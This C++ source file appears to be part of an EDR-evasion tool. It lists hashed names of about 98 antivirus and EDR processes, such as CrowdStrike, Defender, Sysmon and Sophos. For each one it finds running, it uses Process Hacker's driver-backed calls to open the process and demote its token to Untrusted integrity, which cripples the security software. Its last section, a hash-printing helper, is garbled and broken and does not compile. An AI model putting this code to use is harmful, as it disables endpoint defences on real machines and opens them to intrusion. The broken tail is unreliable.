#include "utils.hpp"
#include <TlHelp32.h>
#include "dbg.hpp"
#include <Shlwapi.h>
#include "memory.hpp"
#include "ph.hpp"

namespace Utils
{
	DWORD HASHING_SEED = 0x109bc0b3;

	const DWORD g_edrHashList[] = {
		0xb746e806,//3074877446 activeconsole.exe
		0x53e11368,//1407259496 anti malware.exe
		0x097ba73d,//0159098685 anti-malware.exe
		0xc4d2cca4,//3302149284 antimalware.exe
		0x3c7aabb0,//1014672304 anti virus.exe
		0x3ad2d685,//0986896005 anti-virus.exe
		0xe0a0078c,//3768584076 antivirus.exe
		0xcd230ee2,//3441626850 appsense.exe
		0x53c63fcc,//1405501388 authtap.exe
		0x66e4a6a2,//1726260898 avast.exe
		0x88a8d921,//2292767009 avecto.exe
		0x2d6b9c8f,//0762027151 canary.exe
		0x8fd08345,//2412806981 carbonblack.exe
		0xd217d363,//3524776803 carbon black.exe
		0xfd76b470,//4252415088 cb.exe
		0xda507edc,//3662708444 ciscoamp.exe
		0x110fadd2,//0286240210 cisco amp.exe
		0xd2c394f5,//3536033013 countercept.exe
		0xdad2c006,//3671244806 countertack.exe
		0xf6e46246,//4142162502 cramtray.exe
		0xe7fe65b3,//3892209075 crssvc.exe
		0x4398bfb0,//1134084016 crowdstrike.exe
		0x13ce7a6a,//0332298858 csagent.exe
		0x98530436,//2555577398 csfalcon.exe
		0x44e12e97,//1155608215 csshell.exe
		0xd00225d2,//3489801682 cybereason.exe
		0xaef25f04,//2935119620 cyclorama.exe
		0x1354491a,//0324290842 cylance.exe
		0x0e9fcc53,//0245353555 cyoptics.exe
		0x07048330,//0117736240 cyupdate.exe
		0x0ff06c8b,//0267414667 cyvera.exe
		0x3920c8ee,//0958449902 cyserver.exe
		0x70373883,//1882667139 cytray.exe
		0xd9f45600,//3656668672 darktrace.exe
		0x5aaee70d,//1521411853 defendpoint.exe
		0xaca8b574,//2896737652 defender.exe
		0x4deadabc,//1307237052 eectrl.exe
		0x40741dea,//1081351658 elastic.exe
		0x8deb24e2,//2380997858 endgame.exe
		0x0b4da651,//0189638225 f-secure.exe
		0x5230bfba,//1378926522 forcepoint.exe
		0x15c7d0ac,//0365416620 fireeye.exe
		0x304a86b2,//0810190514 groundling.exe
		0xda5c36e8,//3663476456 GRRservic.exe
		0xdd192fc8,//3709415368 inspector.exe
		0x2e6b88a0,//0778799264 ivanti.exe
		0xf454d136,//4099199286 kaspersky.exe
		0x6e20368d,//1847604877 lacuna.exe
		0x692366ed,//1763927789 logrhythm.exe
		0xe10e9bea,//3775831018 malware.exe
		0xdc6881df,//3697836511 mandiant.exe
		0x215b448c,//0559629452 mcafee.exe
		0x4787dd87,//1200086407 morphisec.exe
		0xcde73002,//3454480386 msascuil.exe
		0x43bb262a,//1136338474 msmpeng.exe
		0xc28a2b70,//3263834992 nissrv.exe
		0xa8db4e8e,//2832944782 omni.exe
		0xd4df3503,//3571397891 omniagent.exe
		0xbbfae7db,//3153782747 osquery.exe
		0x75bc7a84,//1975286404 palo alto networks.exe
		0x90bff93f,//2428500287 pgeposervice.exe
		0xfe68fb93,//4268293011 pgsystemtray.exe
		0x5c083c8b,//1544043659 privilegeguard.exe
		0x477e21d7,//1199448535 procwall.exe
		0xf1069a55,//4043741781 protectorservic.exe
		0xcf0da0ea,//3473776874 qradar.exe
		0x04fae970,//0083552624 redcloak.exe
		0x8013ecfc,//2148789500 secureworks.exe
		0x1125040e,//0287638542 securityhealthservice.exe
		0x657d9a46,//1702730310 semlaunchsv.exe
		0xe84f41fb,//3897508347 sentinel.exe
		0x840eb9a5,//2215557541 sepliveupdat.exe
		0x8960e50d,//2304828685 sisidsservice.exe
		0x12c78179,//0315064697 sisipsservice.exe
		0x682d19c6,//1747786182 sisipsutil.exe
		0x4644649e,//1178887326 smc.exe
		0x2b0b6105,//0722166021 smcgui.exe
		0x188c52cc,//0411849420 snac64.exe
		0x049e81cf,//0077496783 sophos.exe
		0xf3eccf74,//4092383092 splunk.exe
		0x851dd205,//2233324037 srtsp.exe
		0x6f145f71,//1863606129 symantec.exe
		0xb79e2afb,//3080596219 symcorpu.exe
		0x72ab1d00,//1923816704 symefasi.exe
		0x7a67771d,//2053601053 sysinternal.exe
		0x01ee32f0,//0032387824 sysmon.exe
		0xa1e08a97,//2715847319 tanium.exe
		0xdf3a9fc6,//3745161158 tda.exe
		0x03149b15,//0051682069 tdawork.exe
		0xe4725187,//3832697223 tpython.exe
		0x11970980,//0295111040 vectra.exe
		0x6c59b801,//1817819137 wincollect.exe
		0xa1c45332,//2713998130 windowssensor.exe
		0xf82de137,//4163756343 wireshark.exe
		0xc8514b8d,//3360770957 threat.exe
		0xa756c889,//2807482505 xagt.exe
		0x797f398d,//2038380941 xagtnotif.exe
		0xa4e4c29f//2766455455 mssense.exe
	};

	int g_edrlistSize = 98;

#define UPCASE(wch)                     \
    (((wch) >= 'a') && ((wch) <= 'z') ? \
        (wch)                           \
    :                                   \
        ((wch) + ('a'-'A'))             \
    )                                   

	ULONG HashW(PCWSTR key, SIZE_T length, ULONG seed)
	{
		int crc;
		unsigned int byte, c;
		const unsigned int g0 = seed, g1 = g0 >> 1,
			g2 = g0 >> 2, g3 = g0 >> 3, g4 = g0 >> 4, g5 = g0 >> 5,
			g6 = (g0 >> 6) ^ g0, g7 = ((g0 >> 6) ^ g0) >> 1;
		crc = 0xFFFFFFFF;
		SIZE_T len = length;
		while (len-- != 0)
		{
			byte = UPCASE(key[len]);
			crc = crc ^ byte;
			c = ((crc << 31 >> 31) & g7) ^ ((crc << 30 >> 31) & g6) ^
				((crc << 29 >> 31) & g5) ^ ((crc << 28 >> 31) & g4) ^
				((crc << 27 >> 31) & g3) ^ ((crc << 26 >> 31) & g2) ^
				((crc << 25 >> 31) & g1) ^ ((crc << 24 >> 31) & g0);
			crc = ((unsigned)crc >> 8) ^ c;
		}
		return crc;
	}

	INT StrLenW(__in LPCWSTR Str)
	{
		INT Length = 0;
		while (*Str)
		{
			Length++;
			Str++;
		}

		return Length;
	}

	int isInEdrlist(const wchar_t* pn)
	{
		BOOL found = FALSE;
		for (int i = 0; i < g_edrlistSize; i++)
			if (HashW(pn, StrLenW(pn), HASHING_SEED) == g_edrHashList[i])
			{
				found = TRUE;
				break;
			}

		return found;
	}

	BOOL processEDR() 
	{
		unsigned int procId = 0;
		unsigned int pOutbuff = 0;
		DWORD bytesRet = 0;

		PVOID PhBaseAddress = GetModuleHandleW(L"ProcessHacker.exe");

		HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

		if (hSnap != INVALID_HANDLE_VALUE) 
		{
			PROCESSENTRY32W pE;
			pE.dwSize = sizeof(pE);

			if (Process32FirstW(hSnap, &pE)) 
			{
				do 
				{
					if (isInEdrlist(pE.szExeFile)) 
					{
						procId = (unsigned int)pE.th32ProcessID;

						HANDLE ProcessHandle = NULL;
						HANDLE TokenHandle = NULL;

						NTSTATUS Status = PH::PhOpenProcess(PhBaseAddress, &ProcessHandle, PROCESS_ALL_ACCESS, (HANDLE)procId);

						if (!PH_SUCCESS(Status) || !ProcessHandle)
							continue;

						Status = PH::PhOpenProcessToken(PhBaseAddress, ProcessHandle, TOKEN_ALL_ACCESS, &TokenHandle);

						if (!PH_SUCCESS(Status) || !TokenHandle)
							continue;

						if (!Utils::MakeProcessTokenUntrusted(TokenHandle))
							continue;

						if (ProcessHandle)
							CloseHandle(ProcessHandle);

						if (TokenHandle)
							CloseHandle(TokenHandle);
					}
				} while (Process32NextW(hSnap, &pE));
			}
			CloseHandle(hSnap);
		}

		return TRUE;
	}

	BOOL IsLaunchedInsidePH()
	{
		BOOL Result = false;

		do
		{
			WCHAR CurrentPath[1025] = { 0 };

			GetModuleFileNameW(NULL, CurrentPath, 1024);

			LPCWSTR FileName = PathFindFileNameW(CurrentPath);

			if (lstrcmpW(FileName, L"ProcessHacker.exe") != 0)
			{
				break;
			}

			if (!PathRemoveFileSpecW(CurrentPath))
			{
#ifdef _DEBUG
				Debug::DbgOutW(L"[ERROR] %s:%d | PathRemoveFileSpecW failed. Last error: %d\n", __FILEW__, __LINE__, GetLastError());
#endif
				break;
			}

			WCHAR SignaturePath[1025] = { 0 };
			WCHAR DriverPath[1025] = { 0 };

			wsprintfW(SignaturePath, L"%s\\ProcessHacker.sig", CurrentPath);
			wsprintfW(DriverPath, L"%s\\kprocesshacker.sys", CurrentPath);

			if (GetFileAttributesW(SignaturePath) != INVALID_FILE_ATTRIBUTES && GetFileAttributesW(DriverPath) != INVALID_FILE_ATTRIBUTES)
			{
				Result = true;
			}
		} while (false);

		return Result;
	}

	DWORD GetDefenderPID()
	{
		DWORD DefenderPID = 0;
		HANDLE SnapshotHandle = nullptr;

		do
		{
			SnapshotHandle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

			if (SnapshotHandle == INVALID_HANDLE_VALUE)
			{
#ifdef _DEBUG
				Debug::DbgOutW(L"[ERROR] %s:%d | CreateToolhelp32Snapshot failed. Last error: %d\n", __FILEW__, __LINE__, GetLastError());
#endif
				break;
			}

			PROCESSENTRY32W ProcessEntry = { 0 };
			ProcessEntry.dwSize = sizeof(PROCESSENTRY32W);

			if (!Process32FirstW(SnapshotHandle, &ProcessEntry))
			{
#ifdef _DEBUG
				Debug::DbgOutW(L"[ERROR] %s:%d | Process32FirstW failed. Last error: %d\n", __FILEW__, __LINE__, GetLastError());
#endif
				break;
			}

			while (Process32NextW(SnapshotHandle, &ProcessEntry))
			{
				if (lstrcmpW(ProcessEntry.szExeFile, L"MsMpEng.exe") == 0)
				{
					DefenderPID = ProcessEntry.th32ProcessID;
					break;
				}
			}

		} while (false);

		if (SnapshotHandle)
		{
			CloseHandle(SnapshotHandle);
		}

		return DefenderPID;
	}

	BOOL MakeProcessTokenUntrusted(HANDLE TokenHandle)
	{
		BOOL Result = false;

		if (!TokenHandle)
		{
			return Result;
		}
		
		do
		{
			TOKEN_MANDATORY_LABEL TokenMandatoryLabel = { 0 };

			TokenMandatoryLabel.Label.Sid = (PSID)Memory::Alloc(MAX_SID_SIZE);
			TokenMandatoryLabel.Label.Attributes = SE_GROUP_INTEGRITY;

			DWORD SidSize = MAX_SID_SIZE;

			if (!CreateWellKnownSid(WinUntrustedLabelSid, nullptr, TokenMandatoryLabel.Label.Sid, &SidSize))
			{
#ifdef _DEBUG
				Debug::DbgOutW(L"[ERROR] %s:%d | CreateWellKnownSid failed. Last error: %d\n", __FILEW__, __LINE__, GetLastError());
#endif
				break;
			}

			if (!SetTokenInformation(TokenHandle, TokenIntegrityLevel, &TokenMandatoryLabel, sizeof(TOKEN_MANDATORY_LABEL)))
			{
#ifdef _DEBUG
				Debug::DbgOutW(L"[ERROR] %s:%d | SetTokenInformation failed. Last error: %d\n", __FILEW__, __LINE__, GetLastError());
#endif
				break;
			}

			Result = true;
		} while (false);

		return Result;
	}

#define PRINT_API_HASH 1

#ifdef PRINT_API_HASH 

	const wchar_t* g_edrProc[] = {
		L"activeconsole.exe",
		L"0x53e11368,//1407259496 anti malware.exe
		L"0x097ba73d,//0159098685 anti-malware.exe
		L"0xc4d2cca4,//3302149284 antimalware.exe
		L"0x3c7aabb0,//1014672304 anti virus.exe
		L"0x3ad2d685,//0986896005 anti-virus.exe
		L"0xe0a0078c,//3768584076 antivirus.exe
		L"0xcd230ee2,//3441626850 appsense.exe
		L"0x53c63fcc,//1405501388 authtap.exe
		0x66e4a6a2,//1726260898 avast.exe
		0x88a8d921,//2292767009 avecto.exe
		0x2d6b9c8f,//0762027151 canary.exe
		0x8fd08345,//2412806981 carbonblack.exe
		0xd217d363,//3524776803 carbon black.exe
		0xfd76b470,//4252415088 cb.exe
		0xda507edc,//3662708444 ciscoamp.exe
		0x110fadd2,//0286240210 cisco amp.exe
		0xd2c394f5,//3536033013 countercept.exe
		0xdad2c006,//3671244806 countertack.exe
		0xf6e46246,//4142162502 cramtray.exe
		0xe7fe65b3,//3892209075 crssvc.exe
		0x4398bfb0,//1134084016 crowdstrike.exe
		0x13ce7a6a,//0332298858 csagent.exe
		0x98530436,//2555577398 csfalcon.exe
		0x44e12e97,//1155608215 csshell.exe
		0xd00225d2,//3489801682 cybereason.exe
		0xaef25f04,//2935119620 cyclorama.exe
		0x1354491a,//0324290842 cylance.exe
		0x0e9fcc53,//0245353555 cyoptics.exe
		0x07048330,//0117736240 cyupdate.exe
		0x0ff06c8b,//0267414667 cyvera.exe
		0x3920c8ee,//0958449902 cyserver.exe
		0x70373883,//1882667139 cytray.exe
		0xd9f45600,//3656668672 darktrace.exe
		0x5aaee70d,//1521411853 defendpoint.exe
		0xaca8b574,//2896737652 defender.exe
		0x4deadabc,//1307237052 eectrl.exe
		0x40741dea,//1081351658 elastic.exe
		0x8deb24e2,//2380997858 endgame.exe
		0x0b4da651,//0189638225 f-secure.exe
		0x5230bfba,//1378926522 forcepoint.exe
		0x15c7d0ac,//0365416620 fireeye.exe
		0x304a86b2,//0810190514 groundling.exe
		0xda5c36e8,//3663476456 GRRservic.exe
		0xdd192fc8,//3709415368 inspector.exe
		0x2e6b88a0,//0778799264 ivanti.exe
		0xf454d136,//4099199286 kaspersky.exe
		0x6e20368d,//1847604877 lacuna.exe
		0x692366ed,//1763927789 logrhythm.exe
		0xe10e9bea,//3775831018 malware.exe
		0xdc6881df,//3697836511 mandiant.exe
		0x215b448c,//0559629452 mcafee.exe
		0x4787dd87,//1200086407 morphisec.exe
		0xcde73002,//3454480386 msascuil.exe
		0x43bb262a,//1136338474 msmpeng.exe
		0xc28a2b70,//3263834992 nissrv.exe
		0xa8db4e8e,//2832944782 omni.exe
		0xd4df3503,//3571397891 omniagent.exe
		0xbbfae7db,//3153782747 osquery.exe
		0x75bc7a84,//1975286404 palo alto networks.exe
		0x90bff93f,//2428500287 pgeposervice.exe
		0xfe68fb93,//4268293011 pgsystemtray.exe
		0x5c083c8b,//1544043659 privilegeguard.exe
		0x477e21d7,//1199448535 procwall.exe
		0xf1069a55,//4043741781 protectorservic.exe
		0xcf0da0ea,//3473776874 qradar.exe
		0x04fae970,//0083552624 redcloak.exe
		0x8013ecfc,//2148789500 secureworks.exe
		0x1125040e,//0287638542 securityhealthservice.exe
		0x657d9a46,//1702730310 semlaunchsv.exe
		0xe84f41fb,//3897508347 sentinel.exe
		0x840eb9a5,//2215557541 sepliveupdat.exe
		0x8960e50d,//2304828685 sisidsservice.exe
		0x12c78179,//0315064697 sisipsservice.exe
		0x682d19c6,//1747786182 sisipsutil.exe
		0x4644649e,//1178887326 smc.exe
		0x2b0b6105,//0722166021 smcgui.exe
		0x188c52cc,//0411849420 snac64.exe
		0x049e81cf,//0077496783 sophos.exe
		0xf3eccf74,//4092383092 splunk.exe
		0x851dd205,//2233324037 srtsp.exe
		0x6f145f71,//1863606129 symantec.exe
		0xb79e2afb,//3080596219 symcorpu.exe
		0x72ab1d00,//1923816704 symefasi.exe
		0x7a67771d,//2053601053 sysinternal.exe
		0x01ee32f0,//0032387824 sysmon.exe
		0xa1e08a97,//2715847319 tanium.exe
		0xdf3a9fc6,//3745161158 tda.exe
		0x03149b15,//0051682069 tdawork.exe
		0xe4725187,//3832697223 tpython.exe
		0x11970980,//0295111040 vectra.exe
		0x6c59b801,//1817819137 wincollect.exe
		0xa1c45332,//2713998130 windowssensor.exe
		0xf82de137,//4163756343 wireshark.exe
		0xc8514b8d,//3360770957 threat.exe
		0xa756c889,//2807482505 xagt.exe
		0x797f398d,//2038380941 xagtnotif.exe
		0xa4e4c29f//2766455455 mssense.exe
	};

#include <stdio.h>

	void PrintHash()
	{
		BOOL found = FALSE;
		for (int i = 0; i < g_edrlistSize; i++)
		{
			DWORD hash = HashW(g_edrProc[i], StrLenW(pn), HASHING_SEED);
		}
			if (HashW(pn, StrLenW(pn), HASHING_SEED) == g_edrHashList[i])
			{
				found = TRUE;
				break;
			}
		printf("%s", );
	}
#endif

}